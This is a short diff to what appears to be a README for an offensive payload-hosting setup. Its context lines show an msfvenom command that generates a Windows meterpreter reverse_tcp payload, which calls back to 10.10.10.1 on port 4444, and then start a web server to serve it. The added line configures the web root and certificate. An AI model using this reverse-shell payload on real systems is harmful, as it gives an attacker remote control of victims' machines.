@@ -21,6 +21,8 @@ In /web-server/html generate your desired payload:
 
 ```msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.1 lport=4444 -f raw > payload.txt```
 
+Edit web-server/web.py to point to the web root web-server/html and edit the certfile to you generated PEM.
+
 Start the web server:
 
 ```python3  web-server/web.py```
